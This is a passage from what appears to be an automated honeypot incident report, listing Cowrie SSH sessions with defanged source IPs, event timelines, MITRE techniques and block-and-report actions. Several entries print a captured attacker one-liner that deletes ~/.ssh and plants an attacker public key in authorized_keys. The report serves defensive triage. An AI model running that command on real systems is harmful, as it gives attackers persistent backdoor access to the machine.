| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:20:07` | `cowrie.session.connect` |
| `2026-07-02 04:20:07` | `cowrie.client.version` |
| `2026-07-02 04:20:07` | `cowrie.client.kex` |
| `2026-07-02 04:20:07` | `cowrie.login.success` |
| `2026-07-02 04:20:08` | `cowrie.session.params` |
| `2026-07-02 04:20:08` | `cowrie.command.input` |
| `2026-07-02 04:20:08` | `cowrie.command.failed` |
| `2026-07-02 04:20:09` | `cowrie.log.closed` |
| `2026-07-02 04:20:09` | `cowrie.session.params` |
| `2026-07-02 04:20:09` | `cowrie.command.input` |
| `2026-07-02 04:20:10` | `cowrie.session.file_download` |
| `2026-07-02 04:20:10` | `cowrie.log.closed` |
| `2026-07-02 04:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f36d17610894

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-07-02 04:20 |
| **Last Seen** | 2026-07-02 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:20:10` | `cowrie.session.connect` |
| `2026-07-02 04:20:10` | `cowrie.client.version` |
| `2026-07-02 04:20:10` | `cowrie.client.kex` |
| `2026-07-02 04:20:10` | `cowrie.login.success` |
| `2026-07-02 04:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa89b6579869

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-07-02 04:20 |
| **Last Seen** | 2026-07-02 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:20:11` | `cowrie.session.connect` |
| `2026-07-02 04:20:11` | `cowrie.client.version` |
| `2026-07-02 04:20:11` | `cowrie.client.kex` |
| `2026-07-02 04:20:11` | `cowrie.login.success` |
| `2026-07-02 04:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc904dbad332

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:20 |
| **Last Seen** | 2026-07-02 04:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:20:58` | `cowrie.session.connect` |
| `2026-07-02 04:20:58` | `cowrie.client.version` |
| `2026-07-02 04:20:58` | `cowrie.client.kex` |
| `2026-07-02 04:20:58` | `cowrie.login.success` |
| `2026-07-02 04:21:00` | `cowrie.session.params` |
| `2026-07-02 04:21:00` | `cowrie.command.input` |
| `2026-07-02 04:21:00` | `cowrie.log.closed` |
| `2026-07-02 04:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2afa0dbc5af

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-02 04:22 |
| **Last Seen** | 2026-07-02 04:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:22:34` | `cowrie.session.connect` |
| `2026-07-02 04:22:34` | `cowrie.client.version` |
| `2026-07-02 04:22:34` | `cowrie.client.kex` |
| `2026-07-02 04:22:35` | `cowrie.login.success` |
| `2026-07-02 04:22:36` | `cowrie.session.params` |
| `2026-07-02 04:22:36` | `cowrie.command.input` |
| `2026-07-02 04:22:36` | `cowrie.command.failed` |
| `2026-07-02 04:22:37` | `cowrie.log.closed` |
| `2026-07-02 04:22:38` | `cowrie.session.params` |
| `2026-07-02 04:22:38` | `cowrie.command.input` |
| `2026-07-02 04:22:38` | `cowrie.session.file_download` |
| `2026-07-02 04:22:38` | `cowrie.log.closed` |
| `2026-07-02 04:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb06772f2bb1

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-02 04:22 |
| **Last Seen** | 2026-07-02 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:22:38` | `cowrie.session.connect` |
| `2026-07-02 04:22:38` | `cowrie.client.version` |
| `2026-07-02 04:22:38` | `cowrie.client.kex` |
| `2026-07-02 04:22:39` | `cowrie.login.success` |
| `2026-07-02 04:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122872098c2e

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-02 04:22 |
| **Last Seen** | 2026-07-02 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:22:40` | `cowrie.session.connect` |
| `2026-07-02 04:22:40` | `cowrie.client.version` |
| `2026-07-02 04:22:40` | `cowrie.client.kex` |
| `2026-07-02 04:22:41` | `cowrie.login.success` |
| `2026-07-02 04:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5c9c307c4f9

| Field | Detail |
|---|---|
| **Source IP** | `38.252.213[.]122` |
| **First Seen** | 2026-07-02 04:25 |
| **Last Seen** | 2026-07-02 04:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:25:46` | `cowrie.session.connect` |
| `2026-07-02 04:25:46` | `cowrie.client.version` |
| `2026-07-02 04:25:47` | `cowrie.client.kex` |
| `2026-07-02 04:25:47` | `cowrie.login.success` |
| `2026-07-02 04:25:48` | `cowrie.session.params` |
| `2026-07-02 04:25:48` | `cowrie.command.input` |
| `2026-07-02 04:25:48` | `cowrie.command.failed` |
| `2026-07-02 04:25:48` | `cowrie.log.closed` |
| `2026-07-02 04:25:49` | `cowrie.session.params` |
| `2026-07-02 04:25:49` | `cowrie.command.input` |
| `2026-07-02 04:25:49` | `cowrie.session.file_download` |
| `2026-07-02 04:25:49` | `cowrie.log.closed` |
| `2026-07-02 04:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.252.213[.]122` to AbuseIPDB if not already reported
- [ ] Block `38.252.213[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96836be80d68

| Field | Detail |
|---|---|
| **Source IP** | `38.252.213[.]122` |
| **First Seen** | 2026-07-02 04:25 |
| **Last Seen** | 2026-07-02 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:25:49` | `cowrie.session.connect` |
| `2026-07-02 04:25:49` | `cowrie.client.version` |
| `2026-07-02 04:25:49` | `cowrie.client.kex` |
| `2026-07-02 04:25:49` | `cowrie.login.success` |
| `2026-07-02 04:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.252.213[.]122` to AbuseIPDB if not already reported
- [ ] Block `38.252.213[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb9a870c781

| Field | Detail |
|---|---|
| **Source IP** | `38.252.213[.]122` |
| **First Seen** | 2026-07-02 04:25 |
| **Last Seen** | 2026-07-02 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:25:50` | `cowrie.session.connect` |
| `2026-07-02 04:25:50` | `cowrie.client.version` |
| `2026-07-02 04:25:50` | `cowrie.client.kex` |
| `2026-07-02 04:25:50` | `cowrie.login.success` |
| `2026-07-02 04:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.252.213[.]122` to AbuseIPDB if not already reported
- [ ] Block `38.252.213[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abce28021947

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:26 |
| **Last Seen** | 2026-07-02 04:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:26:12` | `cowrie.session.connect` |
| `2026-07-02 04:26:12` | `cowrie.client.version` |
| `2026-07-02 04:26:12` | `cowrie.client.kex` |
| `2026-07-02 04:26:13` | `cowrie.login.success` |
| `2026-07-02 04:26:14` | `cowrie.session.params` |
| `2026-07-02 04:26:14` | `cowrie.command.input` |
| `2026-07-02 04:26:14` | `cowrie.log.closed` |
| `2026-07-02 04:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f7a3c4901bd

| Field | Detail |
|---|---|
| **Source IP** | `34.124.225[.]147` |
| **First Seen** | 2026-07-02 04:29 |
| **Last Seen** | 2026-07-02 04:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:29:35` | `cowrie.session.connect` |
| `2026-07-02 04:29:35` | `cowrie.client.version` |
| `2026-07-02 04:29:35` | `cowrie.client.kex` |
| `2026-07-02 04:29:36` | `cowrie.login.success` |
| `2026-07-02 04:29:37` | `cowrie.session.params` |
| `2026-07-02 04:29:37` | `cowrie.command.input` |
| `2026-07-02 04:29:37` | `cowrie.command.failed` |
| `2026-07-02 04:29:37` | `cowrie.log.closed` |
| `2026-07-02 04:29:38` | `cowrie.session.params` |
| `2026-07-02 04:29:38` | `cowrie.command.input` |
| `2026-07-02 04:29:39` | `cowrie.session.file_download` |
| `2026-07-02 04:29:39` | `cowrie.log.closed` |
| `2026-07-02 04:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.124.225[.]147` to AbuseIPDB if not already reported
- [ ] Block `34.124.225[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e36867c1ee3

| Field | Detail |
|---|---|
| **Source IP** | `34.124.225[.]147` |
| **First Seen** | 2026-07-02 04:29 |
| **Last Seen** | 2026-07-02 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:29:39` | `cowrie.session.connect` |
| `2026-07-02 04:29:39` | `cowrie.client.version` |
| `2026-07-02 04:29:39` | `cowrie.client.kex` |
| `2026-07-02 04:29:40` | `cowrie.login.success` |
| `2026-07-02 04:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.124.225[.]147` to AbuseIPDB if not already reported
- [ ] Block `34.124.225[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-378cfd646113

| Field | Detail |
|---|---|
| **Source IP** | `34.124.225[.]147` |
| **First Seen** | 2026-07-02 04:29 |
| **Last Seen** | 2026-07-02 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:29:41` | `cowrie.session.connect` |
| `2026-07-02 04:29:41` | `cowrie.client.version` |
| `2026-07-02 04:29:41` | `cowrie.client.kex` |
| `2026-07-02 04:29:42` | `cowrie.login.success` |
| `2026-07-02 04:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.124.225[.]147` to AbuseIPDB if not already reported
- [ ] Block `34.124.225[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36547295eb28

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 04:30 |
| **Last Seen** | 2026-07-02 04:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:30:26` | `cowrie.session.connect` |
| `2026-07-02 04:30:27` | `cowrie.client.version` |
| `2026-07-02 04:30:27` | `cowrie.client.kex` |
| `2026-07-02 04:30:33` | `cowrie.login.success` |
| `2026-07-02 04:30:36` | `cowrie.session.params` |
| `2026-07-02 04:30:36` | `cowrie.command.input` |
| `2026-07-02 04:30:38` | `cowrie.log.closed` |
| `2026-07-02 04:30:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec956b4acfa

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 04:30 |
| **Last Seen** | 2026-07-02 04:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:30:59` | `cowrie.session.connect` |
| `2026-07-02 04:31:00` | `cowrie.client.version` |
| `2026-07-02 04:31:00` | `cowrie.client.kex` |
| `2026-07-02 04:31:03` | `cowrie.login.success` |
| `2026-07-02 04:31:05` | `cowrie.session.params` |
| `2026-07-02 04:31:05` | `cowrie.command.input` |
| `2026-07-02 04:31:05` | `cowrie.log.closed` |
| `2026-07-02 04:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed47c33b59f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:31 |
| **Last Seen** | 2026-07-02 04:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:31:34` | `cowrie.session.connect` |
| `2026-07-02 04:31:34` | `cowrie.client.version` |
| `2026-07-02 04:31:34` | `cowrie.client.kex` |
| `2026-07-02 04:31:34` | `cowrie.login.success` |
| `2026-07-02 04:31:36` | `cowrie.session.params` |
| `2026-07-02 04:31:36` | `cowrie.command.input` |
| `2026-07-02 04:31:36` | `cowrie.log.closed` |
| `2026-07-02 04:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aec9d530022

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:17` | `cowrie.session.connect` |
| `2026-07-02 04:32:18` | `cowrie.login.success` |
| `2026-07-02 04:32:18` | `cowrie.session.params` |
| `2026-07-02 04:32:18` | `cowrie.command.input` |
| `2026-07-02 04:32:18` | `cowrie.command.failed` |
| `2026-07-02 04:32:19` | `cowrie.command.input` |
| `2026-07-02 04:32:19` | `cowrie.command.failed` |
| `2026-07-02 04:32:19` | `cowrie.command.input` |
| `2026-07-02 04:32:19` | `cowrie.command.failed` |
| `2026-07-02 04:32:20` | `cowrie.command.input` |
| `2026-07-02 04:32:20` | `cowrie.command.failed` |
| `2026-07-02 04:32:20` | `cowrie.command.input` |
| `2026-07-02 04:32:20` | `cowrie.command.input` |
| `2026-07-02 04:32:20` | `cowrie.command.failed` |
| `2026-07-02 04:32:20` | `cowrie.command.failed` |
| `2026-07-02 04:32:51` | `cowrie.log.closed` |
| `2026-07-02 04:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8f9e78139b5

| Field | Detail |
|---|---|
| **Source IP** | `2.229.200[.]226` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:44` | `cowrie.session.connect` |
| `2026-07-02 04:32:44` | `cowrie.client.version` |
| `2026-07-02 04:32:44` | `cowrie.client.kex` |
| `2026-07-02 04:32:45` | `cowrie.login.success` |
| `2026-07-02 04:32:46` | `cowrie.session.params` |
| `2026-07-02 04:32:46` | `cowrie.command.input` |
| `2026-07-02 04:32:46` | `cowrie.command.failed` |
| `2026-07-02 04:32:46` | `cowrie.log.closed` |
| `2026-07-02 04:32:47` | `cowrie.session.params` |
| `2026-07-02 04:32:47` | `cowrie.command.input` |
| `2026-07-02 04:32:47` | `cowrie.session.file_download` |
| `2026-07-02 04:32:47` | `cowrie.log.closed` |
| `2026-07-02 04:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.229.200[.]226` to AbuseIPDB if not already reported
- [ ] Block `2.229.200[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a5a4a0d23cd

| Field | Detail |
|---|---|
| **Source IP** | `2.229.200[.]226` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:47` | `cowrie.session.connect` |
| `2026-07-02 04:32:47` | `cowrie.client.version` |
| `2026-07-02 04:32:47` | `cowrie.client.kex` |
| `2026-07-02 04:32:47` | `cowrie.login.success` |
| `2026-07-02 04:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.229.200[.]226` to AbuseIPDB if not already reported
- [ ] Block `2.229.200[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8fc8f65f0d3

| Field | Detail |
|---|---|
| **Source IP** | `2.229.200[.]226` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:49` | `cowrie.session.connect` |
| `2026-07-02 04:32:49` | `cowrie.client.version` |
| `2026-07-02 04:32:49` | `cowrie.client.kex` |
| `2026-07-02 04:32:49` | `cowrie.login.success` |
| `2026-07-02 04:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.229.200[.]226` to AbuseIPDB if not already reported
- [ ] Block `2.229.200[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c3839b4298b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:49` | `cowrie.session.connect` |
| `2026-07-02 04:32:49` | `cowrie.client.version` |
| `2026-07-02 04:32:49` | `cowrie.client.kex` |
| `2026-07-02 04:32:49` | `cowrie.login.success` |
| `2026-07-02 04:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee05ac8cd1f7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:49` | `cowrie.session.connect` |
| `2026-07-02 04:32:49` | `cowrie.client.version` |
| `2026-07-02 04:32:49` | `cowrie.client.kex` |
| `2026-07-02 04:32:50` | `cowrie.login.success` |
| `2026-07-02 04:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
